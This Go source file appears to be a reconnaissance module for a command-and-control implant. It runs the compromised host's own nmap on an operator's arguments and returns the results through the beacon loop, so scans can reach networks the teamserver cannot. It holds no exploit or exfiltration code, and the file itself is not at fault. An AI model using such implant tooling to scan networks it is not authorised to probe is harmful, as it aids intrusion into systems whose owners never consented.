// Package nmap runs the target host's own nmap binary for port scanning.
//
// The scan runs wherever the implant runs, so it reaches networks the implant
// can route to and the teamserver cannot. That also means nmap has to be
// installed on the target: Available reports whether it is, and Execute
// surfaces a clear error rather than a bare "executable file not found" when
// it is not.
package nmap

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"time"
)

// DefaultTimeout bounds a single nmap invocation.
//
// handleTask runs inline in the implant's serial beacon loop, so this is also
// the longest the implant goes without checking in: during a scan the session
// looks stale and other queued tasks wait. Raise it only alongside an
// understanding of that trade-off.
const DefaultTimeout = 3 * time.Minute

// waitDelay bounds how long the process is given to release its output pipes
// after the deadline kills it.
const waitDelay = 5 * time.Second

// fallbackPaths are probed when the PATH lookup fails. An implant started from
// cron, systemd or a service manager often inherits a minimal PATH that hides
// an installed nmap, which would make the availability check answer "not
// found" for the exact question it is being asked.
var fallbackPaths = []string{
	"/usr/bin/nmap",
	"/usr/local/bin/nmap",
	"/opt/homebrew/bin/nmap",
}

// lookupFunc resolves an executable name or path, matching exec.LookPath.
type lookupFunc func(name string) (string, error)

// runFunc runs nmap at path with argv and returns its stdout, stderr and the
// run error. It exists as a seam so tests can exercise Execute without
// spawning a real scan.
type runFunc func(ctx context.Context, path string, argv []string) (stdout, stderr []byte, err error)

// Available reports the path to nmap on this host, or an error explaining that
// it is missing.
func Available() (string, error) {
	return availableWith(exec.LookPath)
}

// Execute runs nmap with the given argument string and returns its output.
//
// An empty args is the operator's "is nmap installed here?" probe: it runs
// nmap --version rather than failing.
func Execute(ctx context.Context, args string) (string, error) {
	return executeWith(ctx, exec.LookPath, runNmap, DefaultTimeout, args)
}

func availableWith(lookup lookupFunc) (string, error) {
	if path, err := lookup("nmap"); err == nil {
		return path, nil
	}
	for _, path := range fallbackPaths {
		if _, err := lookup(path); err == nil {
			return path, nil
		}
	}
	return "", errors.New("nmap not found on target: install nmap on the host, or check the implant process's PATH")
}

func executeWith(ctx context.Context, lookup lookupFunc, run runFunc, timeout time.Duration, args string) (string, error) {
	path, err := availableWith(lookup)
	if err != nil {
		return "", err
	}

	argv := tokenize(args)
	if len(argv) == 0 {
		argv = []string{"--version"}
	} else if !hasTarget(argv) {
		return "", errors.New("nmap: no target given (usage: nmap <target> [options], or nmap -iL <file>)")
	}

	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	stdout, stderr, runErr := run(ctx, path, argv)
	out := string(stdout)

	// A scan killed at the deadline still found the ports it reported before
	// then, so keep that output alongside the error instead of discarding it.
	if ctx.Err() != nil {
		notice := fmt.Sprintf("[nmap stopped after %s: output above is partial]", timeout)
		err := fmt.Errorf("nmap timed out after %s", timeout)
		if strings.TrimSpace(out) == "" {
			return notice, err
		}
		return strings.TrimRight(out, "\n") + "\n" + notice, err
	}

	if runErr != nil {
		detail := strings.TrimSpace(string(stderr))
		if detail == "" {
			detail = runErr.Error()
		}
		return out, fmt.Errorf("nmap: %s", detail)
	}

	// nmap writes warnings to stderr while normal results go to stdout, so only
	// fall back to stderr when there is no output to show instead.
	if strings.TrimSpace(out) == "" && len(strings.TrimSpace(string(stderr))) > 0 {
		out = string(stderr)
	}
	return out, nil
}

// runNmap executes nmap with argv passed as separate arguments, never through a
// shell, so characters in an operator-provided target or option cannot be
// interpreted as a command.
func runNmap(ctx context.Context, path string, argv []string) ([]byte, []byte, error) {
	cmd := exec.CommandContext(ctx, path, argv...)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// CommandContext kills only the direct child. If nmap leaves a descendant
	// holding our stdout pipe, reading it would block past the deadline, so cap
	// how long Wait waits for the pipes to close.
	cmd.WaitDelay = waitDelay

	err := cmd.Run()
	return stdout.Bytes(), stderr.Bytes(), err
}

// tokenize splits raw into arguments, honouring single and double quotes.
//
// It mirrors splitArgs in cmd/client (package main, so it cannot be imported).
// The web portal sends its argument box verbatim, so quoting has to be handled
// here rather than upstream by the caller.
func tokenize(raw string) []string {
	var args []string
	var current strings.Builder
	inQuote := false
	var quoteChar byte

	for i := 0; i < len(raw); i++ {
		c := raw[i]
		switch {
		case inQuote && c == quoteChar:
			inQuote = false
		case inQuote:
			current.WriteByte(c)
		case c == '"' || c == '\'':
			inQuote = true
			quoteChar = c
		case c == ' ' || c == '\t' || c == '\n':
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			current.WriteByte(c)
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}

// hasTarget reports whether argv names something to scan.
//
// This is deliberately permissive. nmap's target grammar is broad -- CIDR,
// hyphen ranges such as 10.0.0.1-50, IPv6, hostnames, wildcards, and input
// files via -iL/-iR -- so anything stricter would reject valid scans. Its only
// job is to turn the common "forgot the target" mistake into a clear message
// instead of nmap's usage dump.
func hasTarget(argv []string) bool {
	for i, arg := range argv {
		switch {
		case arg == "-iL" || arg == "-iR":
			// The next token is the file or random-host spec, not a bare host.
			return i+1 < len(argv)
		case strings.HasPrefix(arg, "-iL") || strings.HasPrefix(arg, "-iR"):
			return true // joined form, e.g. -iLhosts.txt
		case !strings.HasPrefix(arg, "-"):
			return true
		}
	}
	return false
}
